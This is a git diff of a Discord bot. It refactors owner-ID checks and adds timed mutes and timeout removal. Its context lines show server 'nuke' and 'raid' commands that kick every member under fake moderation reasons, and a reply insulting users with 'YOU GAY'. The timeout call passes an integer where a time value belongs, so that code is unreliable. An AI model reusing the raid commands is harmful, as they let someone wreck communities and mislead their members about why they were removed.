@@ -62,6 +62,7 @@ from discord.ext.commands.errors import *
 
 import mzhelp
 import mzutils
+from mzutils import *
 
 # for replit config:
 import replit
@@ -896,7 +897,7 @@ async def waitForReply(ctx, msg: discord.Message, timeout=10):
 
 @bot.command()
 async def shutdown(ctx):
-    if str(ctx.author.id) != str(ownerid):
+    if ctx.author.id != ownerid:
         await ctx.send(f"LOL Only <@{ownerid}> can shutdown the bot, get lost\n**YOU GAY**")
         return
     
@@ -926,7 +927,7 @@ async def shutdown(ctx):
 
 @bot.command()
 async def restart(ctx):
-    if str(ctx.author.id) != str(ownerid):
+    if ctx.author.id != ownerid:
         await ctx.send(f"LOL Only <@{ownerid}> can shutdown the bot, get lost\n**YOU GAY**")
         return
     
@@ -958,10 +959,14 @@ def get_muted_role(ctx):
 
 
 @bot.command(aliases=['timeout'])
-async def mute(ctx, member: discord.Member, *, reason=None):
+async def mute(ctx, member: discord.Member, *, duration: str=None, reason=None):
     if ctx.author.id != ownerid and not ctx.author.guild_permissions.manage_server:
         await ctx.send("You don't have permissions!")
-    else:
+        return
+    duration = mzutils.parseTime(duration)
+    
+    if duration is None:
+        # we have to use the Muted role
         mutedrole = get_muted_role(ctx)
         if mutedrole is None:
             # the Muted role does not exist, need to create one
@@ -969,26 +974,38 @@ async def mute(ctx, member: discord.Member, *, reason=None):
                                                     permissions=discord.Permissions(send_messages=False))
         
         await member.add_roles(mutedrole, reason=reason)
-        await ctx.send(f"Muted User: {member} successfully")
+        await ctx.send(f"Muted user: {member} successfully")
+    elif duration > 2419200:  # timeout API allows max. 28 days
+        await ctx.send("Timeout duration cannot exceed than 28 days!")
+        return
+    else:
+        dur = datetime.timedelta(seconds=duration)
+        await member.timeout(until=duration, reason=reason)
+        await ctx.send(f"Muted user: {member} successfully for {dur}")
 
 
 @bot.command(aliases=['untimeout'])
 async def unmute(ctx, member: discord.Member):
-    if str(ctx.author.id) != str(ownerid) and not ctx.author.guild_permissions.manage_server:
+    if ctx.author.id != ownerid and not ctx.author.guild_permissions.manage_server:
         await ctx.send("You don't have permissions!")
-    else:
-        mutedrole = get_muted_role(ctx)
-        if mutedrole is None:
-            await ctx.send("Muted role does not exist!")
-            return
-        
-        try:
+        return
+    mutedrole = get_muted_role(ctx)
+    
+    # remove muted role
+    try:
+        if mutedrole is not None:
             await member.remove_roles(mutedrole)
-        except Exception:
-            await ctx.send(f"User {member} is not muted!")
-            return
-        
-        await ctx.send(f"Unmuted User: {member} successfully")
+    except Exception:
+        pass
+    
+    # remove timeout
+    try:
+        await member.timeout(until=None, reason=None)
+        # As per API, if "until" is None, the timeout is removed
+    except Exception:
+        pass
+    
+    await ctx.send(f"Unmuted user: {member} successfully")
 
 
 @commands.cooldown(1, 5, commands.BucketType.guild)
@@ -1007,11 +1024,11 @@ Nuke performed by: <@{ctx.author.id}>""")
 
 @bot.command(aliases=['raidstep1'])
 async def softnuke_server(ctx):
-    if str(ctx.author.id) != str(ownerid):
+    if ctx.author.id != ownerid:
         await ctx.send("You don't have permissions to do that!")
     else:
         async def nuke_channel_2(txt):
-            if str(txt.author.id) != str(ownerid):
+            if txt.author.id != ownerid:
                 await txt.send("You don't have permissions to do that!")
             else:
                 text_channel_list = []
@@ -1034,7 +1051,7 @@ async def hardnuke_server(ctx):
     krlist = ["Kicked for inactivity", "Violation of rules", "Break rules", "Kick command used", "Kicked bot",
               "Repeated Warnings", "Kicked with Dyno", None]
     
-    if str(ctx.author.id) != str(ownerid):
+    if ctx.author.id != ownerid:
         await ctx.send("You don't have `Administrator` Permissions!")
     else:
         for member in ctx.guild.members:
